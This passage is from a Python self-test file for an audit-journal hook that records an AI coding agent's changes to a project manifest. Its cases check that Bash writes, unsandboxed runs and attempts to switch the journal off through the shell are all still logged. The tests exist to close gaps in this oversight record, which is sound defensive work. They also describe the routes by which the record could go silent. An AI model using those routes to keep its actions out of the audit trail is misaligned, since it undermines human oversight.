        def f_bash(sid, *, sandbox_off=None):
            """A Bash payload: a command and nothing that names a file. The whole
            fault was that this shape carried no `file_path` for `classify()`."""
            ti = {"command": "python3 -c 'write the manifest'"}
            if sandbox_off is not None:
                ti["dangerouslyDisableSandbox"] = sandbox_off
            return {"tool_name": "Bash", "tool_input": ti, "session_id": sid,
                    "cwd": fproj}

        def f_edit(sid, rel=None):
            return {"tool_name": "Edit", "session_id": sid,
                    "tool_input": {"file_path": rel or man_rel,
                                   "new_string": "x"}, "cwd": fproj}

        # f1: the headline. An edit-tool write seeds the slot (as it always did),
        # and then the SAME session finishes the task through a shell command.
        f_write(manifest_doc(status="pending"))
        M.pre_cache(f_edit("f-1"), cfg=cfg, root=fproj)
        f_write(manifest_doc(status="in_progress"))
        M.post_entries(f_edit("f-1"), cfg=cfg, root=fproj)
        f_write(manifest_doc(status="done", completed="2026-08-25T00:00:00Z",
                             commit="c" * 40))
        _f1 = M.post_entries(f_bash("f-1"), cfg=cfg, root=fproj)
        _f1_acts = [e.get("action") for e in _f1]
        check("f1 a BASH write after an edit write yields the full set of derived "
              "rows - the manifest moved and the payload names no path, which is "
              "the exact shape that used to record nothing at all",
              _f1_acts == ["manifest.edit", "task.complete", "task.commit"]
              and _f1[1]["details"]["taskId"] == "P1.1"
              and _f1[2]["details"]["commit"] == "c" * 40
              and "status in_progress->done" in _f1[0]["summary"],
              repr(_f1_acts) + " " + repr([e.get("summary") for e in _f1]))
        # f2 IS THE SECOND-DIRECTION MUTATION and it is the reason the lane
        # compares digests instead of recording on arrival. A pass that filed a row
        # for every Bash call would pass f1 for ever and turn the plan's audit
        # trail into a shell history - the one thing THE ONE EXCEPTION is careful
        # not to do. It looks vacuous; it is the only case here that fails when the
        # comparison becomes unconditional.
        check("f2 a Bash call during which the manifest did NOT move records "
              "nothing - the journal is the audit trail of the plan, not a shell "
              "log",
              M.post_entries(f_bash("f-1"), cfg=cfg, root=fproj) == [])
        # f3: the refresh. f1 recorded a row, so the slot must now hold `done`;
        # a SECOND Bash write in the same session has to be diffed against THAT
        # and not against the state the edit-tool Pre pass had cached. The fixture
        # values separate the two: diffed against the stale pre-image the summary
        # would say `in_progress->blocked` and carry a task.complete, and diffed
        # against the refreshed one it says `done->blocked` and carries none.
        f_write(manifest_doc(status="blocked", completed="2026-08-25T00:00:00Z",
                             commit="c" * 40))
        _f3 = M.post_entries(f_bash("f-1"), cfg=cfg, root=fproj)
        check("f3 the slot was REFRESHED, so a second Bash write in one session is "
              "derived against the state the last ROW recorded - against the stale "
              "edit-tool pre-image this would have said in_progress->blocked and "
              "emitted a task.complete for a task that completed a write ago",
              [e.get("action") for e in _f3] == ["manifest.edit", "task.blocked"]
              and "status done->blocked" in _f3[0]["summary"]
              and not [e for e in _f3 if e.get("action") == "task.complete"],
              repr([(e.get("action"), e.get("summary")) for e in _f3]))
        # f4: the slot exists but holds no parseable pre-image (over the cap, or
        # bytes that are not JSON). The write IS established - the digest moved -
        # and the field-level answer is not available, so the row says so instead
        # of looking like a write where nothing tracked had changed.
        _f4_slot = M._slot_path(fproj, cfg, f_bash("f-4"), man_rel)
        _config.ensure_local_dir(os.path.dirname(_f4_slot))
        with open(_f4_slot, "w", encoding="utf-8") as fh:
            json.dump({"path": man_rel, "ts": "t", "sha256": "sha256:stale",
                       "content": "{not json"}, fh)
        _f4 = M.post_entries(f_bash("f-4"), cfg=cfg, root=fproj)
        check("f4 a Bash write with no PARSEABLE pre-image emits the generic row "
              "and SAYS the completion records were not derived - converting the "
              "silence into a stated gap is the whole repair; a bare summary here "
              "reads exactly like a write that moved nothing",
              len(_f4) == 1
              and _f4[0]["action"] == "manifest.edit"
              and _f4[0]["summary"].startswith("Bash wrote " + man_rel)
              and M.DERIVATION_MISSED in _f4[0]["summary"]
              and (_f4[0].get("details") or {}).get("reason")
              == M.DERIVATION_MISSED, repr(_f4))
        # f4b, the paired negative for f4 in the OTHER direction from h7b's: the
        # marker must not survive onto a Bash row that did derive. f1 is the
        # derived row; asserted here rather than trusted from f1's summary check,
        # because f1 asks what the summary SAYS and this asks what it does not.
        # Read through `_f1 and` rather than subscripting: with the fault restored
        # `_f1` is EMPTY, and an IndexError here killed every case after this one -
        # a mutation that kills the suite teaches nothing about the suite. Measured:
        # eight named cases below never ran the first time this matrix was driven.
        _f1_first = _f1[0] if _f1 else {}
        check("f4b ...and a Bash row that DID derive carries neither the marker "
              "nor a `reason` - a gap statement that fires always is the mutation "
              "this catches",
              bool(_f1)
              and M.DERIVATION_MISSED not in _f1_first.get("summary", "")
              and "reason" not in (_f1_first.get("details") or {})
              and all("reason" not in (e.get("details") or {}) for e in _f1),
              repr(_f1_first)[:200])
        # f5: no slot AT ALL is not a change. There is no baseline, so there is no
        # basis for a claim, and a row saying "Bash wrote <path>" would be one
        # invented to fill the gap - fabricated evidence inside the file whose only
        # job is to be trustworthy. The pass seeds instead, which is what makes the
        # session's NEXT write diffable whatever writes it.
        _f5_slot = M._slot_path(fproj, cfg, f_bash("f-5"), man_rel)
        _f5_pre_exists = os.path.exists(_f5_slot)
        _f5 = M.post_entries(f_bash("f-5"), cfg=cfg, root=fproj)
        _f5_seeded = M._parse_preimage(M._read_preimage(fproj, cfg,
                                                        f_bash("f-5"), man_rel))
        check("f5 a Bash call with no slot for the target claims nothing and SEEDS "
              "one - a row asserting a move it cannot see would be a claim whose "
              "basis is missing, in the one file that exists to be trusted",
              not _f5_pre_exists and _f5 == []
              and os.path.exists(_f5_slot)
              and isinstance(_f5_seeded, dict)
              and _f5_seeded["phases"][0]["tasks"][0]["status"] == "blocked",
              repr((_f5, _f5_pre_exists, repr(_f5_seeded)[:120])))
        # f5b: and the seed is load-bearing rather than decorative - the write that
        # follows it in the SAME session is fully derived. Without the seed f5's
        # session would keep losing rows for ever, which a check on f5 alone
        # cannot tell from the fix.
        f_write(manifest_doc(status="done", completed="2026-08-25T02:00:00Z",
                             commit="c" * 40))
        _f5b = M.post_entries(f_bash("f-5"), cfg=cfg, root=fproj)
        check("f5b ...and that seed is what the NEXT Bash write in the same "
              "session is diffed against, so the session stops losing rows after "
              "one call instead of for ever",
              [e.get("action") for e in _f5b] == ["manifest.edit",
                                                  "task.complete"]
              and "status blocked->done" in _f5b[0]["summary"],
              repr([(e.get("action"), e.get("summary")) for e in _f5b]))
        # f6: the slot is keyed per (session, target). Two sessions each cached a
        # DIFFERENT pre-image; a Bash call in one must be diffed against its own.
        # The fixture values are what separate the two - a clobbered slot would
        # give one of them the other's `from` status, so both directions are
        # asserted rather than one.
        f_write(manifest_doc(status="pending"))
        M.pre_cache(f_edit("f-A"), cfg=cfg, root=fproj)
        f_write(manifest_doc(status="in_progress"))
        M.pre_cache(f_edit("f-B"), cfg=cfg, root=fproj)
        f_write(manifest_doc(status="done", completed="2026-08-25T03:00:00Z"))
        _f6a = M.post_entries(f_bash("f-A"), cfg=cfg, root=fproj)
        _f6b = M.post_entries(f_bash("f-B"), cfg=cfg, root=fproj)
        check("f6 two sessions do not clobber each other's slot on the Bash lane "
              "either - each is diffed against the pre-image IT cached, which is "
              "what keeps parallel worktrees from inventing each other's history",
              "status pending->done" in (_f6a[0]["summary"] if _f6a else "")
              and "status in_progress->done" in (_f6b[0]["summary"] if _f6b else ""),
              repr([e.get("summary") for e in _f6a + _f6b]))
        # f7: the journal is never its own subject, on this lane too. DRIVEN
        # THROUGH THE HOOK and not through `_bash_targets` plus a filter spelled
        # again in the case - the first draft did the latter, and it would have
        # passed with the hook's own filter deleted, which is the whole shape this
        # repo's guide calls a check that asserts nothing. `journal.dir` aimed at
        # the shard directory is a configuration a user can write, and it is the
        # only way a journal path reaches this sweep, because the sweep lists
        # `.json` and a journal file is `.jsonl`.
        _f7_cfg = _config._deep_merge(cfg,
                                      {"journal": {"dir": "docs/audit/phases"}})
        _f7_rel = "docs/audit/phases/P9.json"
        _f7_abs = os.path.join(fproj, _f7_rel)
        f_write({"id": "P9", "status": "in_progress", "tasks": []}, _f7_abs)
        f_write(manifest_doc(status="pending"))
        M._write_slot(fproj, _f7_cfg, f_bash("f-7"), _f7_rel)
        M._write_slot(fproj, _f7_cfg, f_bash("f-7"), man_rel)
        f_write({"id": "P9", "status": "done", "mergedAt": "2026-08-25T07:00:00Z",
                 "tasks": []}, _f7_abs)
        f_write(manifest_doc(status="in_progress"))
        _f7_rows = M.post_entries(f_bash("f-7"), cfg=_f7_cfg, root=fproj)
        _f7_targets = sorted(set(e.get("target") for e in _f7_rows))
        check("f7 the journal is never its own subject on the Bash lane - a shard "
              "path that `journal.dir` has claimed moves without a row, while the "
              "manifest index beside it still gets one, so the filter is narrowing "
              "and not merely emptying the sweep",
              _f7_targets == [man_rel]
              and _f7_rel in M._bash_targets(fproj, _f7_cfg)
              and not [e for e in _f7_rows if e.get("target") == _f7_rel],
              repr([(e.get("action"), e.get("target")) for e in _f7_rows]))
        # f8: a shard, which under the sharded layout is what almost every real
        # write actually touches - the index alone would have closed this fault for
        # the layout nobody runs at scale.
        _f8_rel = "docs/audit/phases/P4.json"
        _f8_abs = os.path.join(fproj, _f8_rel)
        f_write({"id": "P4", "title": "p", "status": "in_progress",
                 "tasks": [{"id": "P4.1", "title": "t", "status": "in_progress",
                            "commit": None, "completedAt": None}]}, _f8_abs)
        M.pre_cache(f_edit("f-8", _f8_rel), cfg=cfg, root=fproj)
        f_write({"id": "P4", "title": "p", "status": "done",
                 "mergedAt": "2026-08-25T04:00:00Z",
                 "tasks": [{"id": "P4.1", "title": "t", "status": "done",
                            "commit": None,
                            "completedAt": "2026-08-25T04:00:00Z"}]}, _f8_abs)
        _f8 = M.post_entries(f_bash("f-8"), cfg=cfg, root=fproj)
        check("f8 a phase SHARD written by Bash is swept too, phase.signoff "
              "included - under the sharded layout almost every write IS a shard, "
              "so a sweep of the index alone would have left the fault open where "
              "it actually bites",
              sorted(e.get("action") for e in _f8)
              == ["manifest.edit", "phase.signoff", "task.complete"]
              and all(e["target"] == _f8_rel for e in _f8), repr(_f8))
        # f9: the digest is taken at EVERY size, so an over-the-cap manifest that
        # moves is still noticed. The old reader took nothing past the cap, which
        # would have made a large manifest invisible to this lane rather than
        # merely undiffable - a silent gap in place of a stated one.
        _f9_rel = "docs/audit/phases/P8.json"
        _f9_abs = os.path.join(fproj, _f9_rel)
        with open(_f9_abs, "w", encoding="utf-8") as fh:
            fh.write('{"id":"P8","tasks":[],"pad":"' + "x" * (5 * 1024 * 1024)
                     + '"}')
        _f9_slot = M._write_slot(fproj, cfg, f_bash("f-9"), _f9_rel)
        with open(_f9_slot, encoding="utf-8") as fh:
            _f9_obj = json.load(fh)
        with open(_f9_abs, "w", encoding="utf-8") as fh:
            fh.write('{"id":"P8","tasks":[],"pad":"' + "y" * (5 * 1024 * 1024)
                     + '"}')
        _f9 = [e for e in M.post_entries(f_bash("f-9"), cfg=cfg, root=fproj)
               if e.get("target") == _f9_rel]
        check("f9 an over-the-cap manifest still has a DIGEST, so a Bash write to "
              "it is noticed and reported as a missed derivation - the cap costs "
              "the field-level diff, and it must not also cost the detection",
              _f9_obj.get("content") is None
              and str(_f9_obj.get("sha256") or "").startswith("sha256:")
              and len(_f9) == 1
              and M.DERIVATION_MISSED in _f9[0]["summary"], repr(_f9_obj)[:160])
        # f10: the disable loophole on the new lane. A shell that flips
        # `journal.enabled` off must be journalled by its own last row, judged
        # against the PRE-IMAGE config - the same rule k1 pins for the edit lane,
        # asserted here because the Bash lane resolves `enabled` on its own.
        f_write({"journal": {"enabled": True}}, f_cfg_abs)
        M._write_slot(fproj, cfg, f_bash("f-10"), _config.CONFIG_REL)
        f_write({"journal": {"enabled": False}}, f_cfg_abs)
        _f10 = M.post_entries(f_bash("f-10"), cfg=post_cfg, root=fproj)
        check("f10 flipping journal.enabled off THROUGH BASH is still journalled - "
              "the loophole k1 closed for the edit lane is judged against the "
              "pre-image config here too, so the flip cannot silence its own row",
              len(_f10) == 1 and _f10[0]["action"] == "config.edit"
              and (_f10[0].get("details") or {}).get("changes")
              == [{"field": "journal.enabled", "from": True, "to": False}],
              repr(_f10))
        # f10b: the second direction. With the switch already off, the lane records
        # nothing and leaves no state behind - a sweep that ran anyway would be the
        # plugin outliving the user's own switch.
        # The fixture carries a CONFIG FILE as well as a manifest, and that is the
        # half that makes the case able to fail: with the switch off the sweep is
        # narrowed to the config alone (nothing else can still owe a row), so a
        # project without one exercises no seeding decision at all and the case
        # passes with the switch check deleted. Measured - it did.
        _f10b_dir = os.path.join(fproj, "offstate")
        os.makedirs(os.path.join(_f10b_dir, "docs", "audit"), exist_ok=True)
        f_write(manifest_doc(status="in_progress"),
                os.path.join(_f10b_dir, man_rel))
        f_write({"journal": {"enabled": False}},
                os.path.join(_f10b_dir, _config.CONFIG_REL))
        check("f10b a Bash call while the journal is already off records nothing "
              "and leaves no slot - nothing here outlives the user's switch",
              M.post_entries(f_bash("f-10b"), cfg=post_cfg, root=_f10b_dir) == []
              and not os.path.isdir(os.path.join(_f10b_dir, ".claude", "state")))
        # f11: the P0-S row and the manifest rows share one Bash call, and both
        # land. The lane was one `return` before F194, so "either/or" is exactly
        # the shape a careless fix would have kept.
        f_write(manifest_doc(status="in_progress"))
        M._write_slot(fproj, cfg, f_bash("f-11"), man_rel)
        f_write(manifest_doc(status="done", completed="2026-08-25T05:00:00Z"))
        _f11 = M.post_entries(f_bash("f-11", sandbox_off=True), cfg=cfg,
                              root=fproj)
        check("f11 one Bash call carrying BOTH an unsandboxed run and a manifest "
              "move records both, in that order - the lane used to be a single "
              "`return unsandboxed_entries(...)`, so either/or is the shape a "
              "careless repair keeps",
              [e.get("action") for e in _f11]
              == ["bash.unsandboxed", "manifest.edit", "task.complete"],
              repr([e.get("action") for e in _f11]))
        # f12: fail-open, the property this hook cannot trade away - it runs at
        # PostToolUse, so anything it raises breaks the write it was recording.
        #
        # THE INPUT SET WAS MEASURED, NOT GUESSED, and the first draft of this case
        # is why that sentence is here. It drove four shallow-malformed Bash
        # payloads - a missing `tool_input`, a null one, a null `command` - and
        # every one of them is handled by a guard long BEFORE the outer `except`,
        # so the case was green with fail-open deleted. What reaches the outer net
        # is a payload that is not a mapping at all, a config that is not a
        # mapping, and a `manifestPath` of the wrong TYPE (the sweep and
        # `classify` both join it to a path with no guard) - and the last one is
        # driven on BOTH lanes, because they read it in different places.
        _f12 = []
        for _label, _bad, _bcfg in (
                ("payload is not a mapping", None, cfg),
                ("config is not a mapping", f_bash("f-12"), []),
                ("manifestPath is not a path, Bash lane", f_bash("f-12"),
                 _config._deep_merge(cfg, {"manifestPath": 17})),
                ("manifestPath is not a path, edit lane", f_edit("f-12"),
                 _config._deep_merge(cfg, {"manifestPath": 17}))):
            _ok, _got = _harness.attempt(M.post_entries, _bad, cfg=_bcfg,
                                         root=fproj)
            _f12.append((_label, _ok, _got if not _ok
                         else type(_got).__name__ + repr(_got)[:40]))
        check("f12 the inputs that reach unguarded code fail OPEN with a list, "
              "never a raise - this runs at PostToolUse, so an exception here "
              "breaks the write it was recording",
              len(_f12) == 4
              and all(ok and kind.startswith("list") for _l, ok, kind in _f12),
              repr(_f12))
        # f13: the slot is keyed per (session, TARGET), and f6 only pinned the
        # session half. The index and a shard moving in ONE Bash call have to be
        # diffed against their OWN pre-images; sharing a slot would give one of
        # them the other's `from` value, which is a row that verifies perfectly
        # and describes a change that never happened.
        _f13_rel = "docs/audit/phases/P7.json"
        _f13_abs = os.path.join(fproj, _f13_rel)
        f_write(manifest_doc(status="pending"))
        f_write({"id": "P7", "title": "p", "status": "in_progress", "tasks": [
            {"id": "P7.1", "title": "t", "status": "blocked", "commit": None,
             "completedAt": None}]}, _f13_abs)
        M._write_slot(fproj, cfg, f_bash("f-13"), man_rel)
        M._write_slot(fproj, cfg, f_bash("f-13"), _f13_rel)
        f_write(manifest_doc(status="done", completed="2026-08-25T08:00:00Z"))
        f_write({"id": "P7", "title": "p", "status": "in_progress", "tasks": [
            {"id": "P7.1", "title": "t", "status": "done", "commit": None,
             "completedAt": "2026-08-25T08:00:00Z"}]}, _f13_abs)
        _f13 = M.post_entries(f_bash("f-13"), cfg=cfg, root=fproj)
        _f13_by = dict((e["target"], e["summary"]) for e in _f13
                       if e.get("action") == "manifest.edit")
        check("f13 the slot's key carries the TARGET as well as the session, so "
              "the index and a shard moving in ONE Bash call are each diffed "
              "against their own pre-image - one shared slot would hand one of "
              "them the other's `from` value",
              "status pending->done" in _f13_by.get(man_rel, "")
              and "status blocked->done" in _f13_by.get(_f13_rel, ""),
              repr(_f13_by))
        # f14 END TO END, for the reason d0-d4 and s6-s7 exist: an entry dict is a
        # decision, not evidence. The claim F194 makes is about the CHAIN, and a
        # claim about the chain has to be made against the chain - through main(),
        # over stdin, with a Bash payload and no `file_path` in it.
        eproj = os.path.join(tmp, "f194-e2e")
        os.makedirs(os.path.join(eproj, "docs", "audit"))
        _e_man = os.path.join(eproj, man_rel)

        def _e_write(obj):
            with open(_e_man, "w", encoding="utf-8") as fh:
                json.dump(obj, fh)

        def _e_drive(payload_obj):
            import io as _io
            _si, _so = sys.stdin, sys.stdout
            cap = _io.StringIO()
            code = None
            try:
                sys.stdin = _io.StringIO(json.dumps(payload_obj))
                sys.stdout = cap
                os.environ["CLAUDE_PROJECT_DIR"] = eproj
                try:
                    M.main()
                except SystemExit as exc:
                    code = exc.code
            finally:
                sys.stdin, sys.stdout = _si, _so
                os.environ["CLAUDE_PROJECT_DIR"] = tmp
            return code, cap.getvalue()

        _e_write(manifest_doc(status="in_progress"))
        _e_pre = dict(f_edit("f-e2e"))
        _e_pre["cwd"] = eproj
        _e_pre["hook_event_name"] = "PreToolUse"
        _e_drive(_e_pre)
        _e_write(manifest_doc(status="done", completed="2026-08-25T06:00:00Z",
                              commit="e" * 40))
        _e_bash = dict(f_bash("f-e2e"))
        _e_bash["cwd"] = eproj
        _e_bash["hook_event_name"] = "PostToolUse"
        _e_code, _e_spoke = _e_drive(_e_bash)
        _e_res = jmod.verify(eproj)
        _e_rows = jmod.read_all(eproj)
        check("f14 through main() over stdin, a Bash payload with no file_path "
              "appends the semantic row and both completion rows, the chain "
              "verifies, and the hook still says nothing on any channel",
              _e_code in (0, None) and _e_spoke == ""
              and _e_res["ok"] and not _e_res["findings"]
              and [r.get("action") for r in _e_rows]
              == ["manifest.edit", "task.complete", "task.commit"]
              and _e_rows[1].get("details", {}).get("taskId") == "P1.1",
              repr((_e_code, _e_spoke[:80], [r.get("action") for r in _e_rows],
                    _e_res["findings"])))
        # f14b: the drift warning that was the ONLY notice of this fault is now
        # absent, because the row exists. Asserted after f14's append and off the
        # same project - `verify` recomputes the manifest's digest and compares it
        # with the last row that recorded it, which is precisely what used to warn.
        # ...AND THE ROW COUNT IS PART OF THE ASSERTION, because an EMPTY journal
        # has no drift warning either: `verify` compares the last row that recorded
        # a target against the file, so with no such row there is nothing to
        # compare and nothing to warn about. The first draft of this case asserted
        # only the absence and therefore passed on the unfixed hook - the exact
        # shape of a check that asserts nothing.
        check("f14b ...and `verify` no longer warns that the manifest changed with "
              "no row to explain it - that after-the-fact warning was the only "
              "notice this fault ever gave, and it is absent because a ROW now "
              "records the state, not because the journal is empty",
              _e_res["rows"] == 3
              and not [w for w in _e_res["warnings"] if "never saw" in w],
              repr((_e_res["rows"], _e_res["warnings"])))

        # --- w: the wiring - main() routes by hook_event_name ------------------
        wproj = os.path.join(tmp, "wire")
        os.makedirs(os.path.join(wproj, "docs", "audit"))
        wman = os.path.join(wproj, "docs", "audit", "audit-plan.json")

        def wwrite(status):
            with open(wman, "w", encoding="utf-8") as fh:
                json.dump({"meta": {"version": 2}, "phases": [
                    {"id": "P1", "title": "p", "status": "in_progress",
                     "tasks": [{"id": "P1.1", "title": "t", "status": status,
                                "commit": None,
                                "completedAt": "2026-08-11T02:00:00Z"
                                if status == "done" else None}]}]}, fh)

        def drive(event):
            import io
            _stdin, _stdout = sys.stdin, sys.stdout
            cap = io.StringIO()
            code = None
            try:
                sys.stdin = io.StringIO(json.dumps(
                    {"tool_name": "Edit", "session_id": "wire-1",
                     "hook_event_name": event,
                     "tool_input": {"file_path": "docs/audit/audit-plan.json",
                                    "new_string": "x"},
                     "cwd": wproj}))
                sys.stdout = cap
                os.environ["CLAUDE_PROJECT_DIR"] = wproj
                try:
                    M.main()
                except SystemExit as exc:
                    code = exc.code
            finally:
                sys.stdin, sys.stdout = _stdin, _stdout
                os.environ["CLAUDE_PROJECT_DIR"] = tmp
            return code, cap.getvalue()

        wwrite("in_progress")
        code, spoke = drive("PreToolUse")
        wslots = [f for f in os.listdir(os.path.join(wproj, ".claude", "state"))
                  if f.startswith("journal-preimage-")] if os.path.isdir(
                      os.path.join(wproj, ".claude", "state")) else []
        check("w1 the Pre pass through main() exits 0, prints nothing, and "
              "leaves a slot",
              code in (0, None) and spoke == "" and len(wslots) == 1,
              repr((code, spoke[:80], wslots)))
        wwrite("done")
        code, spoke = drive("PostToolUse")
        wres = jmod.verify(wproj)
        wrows = jmod.read_all(wproj)
        check("w2 the Post pass through main() appends the semantic row AND the "
              "task.complete row, and the chain verifies",
              code in (0, None) and spoke == "" and wres["ok"]
              and [r.get("action") for r in wrows] ==
              ["manifest.edit", "task.complete"]
              and wrows[1].get("details", {}).get("taskId") == "P1.1",
              repr((wres, [r.get("action") for r in wrows])))

        # --- j: the F-F3 sidecar -----------------------------------------------
        # The append above put the journal file into git status, and
        # guard-bash-writes' next Bash pass used to blame the shell command for
        # it. After every successful append, main() records the written file's
        # rel path in <stateDir>/bash-writes-plugin-<sid>.json -- ONE writer
        # (this hook), because hooks on the same event run in parallel and a
        # shared state file would race. guard-bash-writes reads it and skips
        # exactly those rels; its k group drives THIS writer, so the two sides
        # cannot drift about where the sidecar lives.
        _wsd = os.path.join(wproj, ".claude", "state")
        _wsides = ([f for f in os.listdir(_wsd)
                    if f.startswith("bash-writes-plugin-")]
                   if os.path.isdir(_wsd) else [])
        _wjfiles = jmod.journal_files(jmod.journal_dir(wproj, cfg))
        _wjrels = [_output.posix_rel(p, wproj)
                   for p in _wjfiles]
        _wslot = (os.path.join(_wsd, _wsides[0]) if _wsides else None)
        try:
            with open(_wslot, "r", encoding="utf-8") as fh:
                _wobj = json.load(fh)
        except Exception:
            _wobj = {}
        check("j1 the Post pass leaves a sidecar naming the journal file the "
              "append landed in",
              len(_wsides) == 1
              and sorted(_wobj.get("pluginWrote") or []) == sorted(_wjrels),
              repr((_wsides, _wobj, _wjrels)))
        check("j2 the sidecar name carries the bash-writes- prefix, so the "
              "existing state GC sweeps it",
              bool(_wsides) and _wsides[0].startswith("bash-writes-")
              and ("wire-1" in _wsides[0]))
        wwrite("in_progress")
        drive("PreToolUse")
        wwrite("done")
        drive("PostToolUse")
        try:
            with open(_wslot, "r", encoding="utf-8") as fh:
                _wobj2 = json.load(fh)
        except Exception:
            _wobj2 = {}
        check("j3 a second append to the same file does not duplicate the "
              "entry",
              sorted(_wobj2.get("pluginWrote") or []) == sorted(_wjrels),
              repr(_wobj2))
        # `sys.modules[__name__]` was this module when the case lived inside the
        # hook. Carried literally it names the TEST module, whose `getattr`
        # default hands back `lambda *a: None` - which returns None, so the case
        # passes while asking the hook nothing at all. Named on the subject, and
        # without the swallowing default: a vanished function is an AttributeError
        # `_harness.run` reports as a failing case, which is what it should be.
        check("j4 record_plugin_write never raises on garbage - it guards a "
              "PostToolUse hook",
              M.record_plugin_write(None, None, None, None) is None)
        # A disabled journal appends nothing, so there is nothing to record.
        _joff = os.path.join(tmp, "joff")
        os.makedirs(os.path.join(_joff, "docs", "audit"), exist_ok=True)
        _joffcfg = _config._deep_merge(cfg, {"journal": {"enabled": False}})
        check("j5 a disabled journal leaves no sidecar (nothing was appended)",
              M.post_entries(payload("Edit", "docs/audit/audit-plan.json",
                                     sid="j5"), cfg=_joffcfg, root=_joff) == []
              and not os.path.isdir(os.path.join(_joff, ".claude", "state")))
    finally:
        if prev_env is None:
            os.environ.pop("CLAUDE_PROJECT_DIR", None)
        else:
            os.environ["CLAUDE_PROJECT_DIR"] = prev_env
        shutil.rmtree(tmp, ignore_errors=True)

    # (p) the sidecar's state dir is self-ignoring
    tmp_i = tempfile.mkdtemp(prefix="jw-ignore-")
    try:
        _cfg_i = dict(_config.DEFAULTS)
        M.record_plugin_write(tmp_i, _cfg_i, {"session_id": "s-i"},
                              os.path.join(tmp_i, "docs", "audit", "journal",
                                           "j.jsonl"))
        check("p1 record_plugin_write's state dir carries a `*` .gitignore",
              os.path.exists(os.path.join(
                  tmp_i, str(_cfg_i["stateDir"]), ".gitignore")))
    finally:
        shutil.rmtree(tmp_i, ignore_errors=True)


def _selftest():
    return _harness.run(_cases)


if __name__ == "__main__":
    safe_stdio()
    if "--selftest" in sys.argv[1:]:
        raise SystemExit(_selftest())
    sys.stderr.write("usage: test_journal_writes.py --selftest\n")
    raise SystemExit(2)
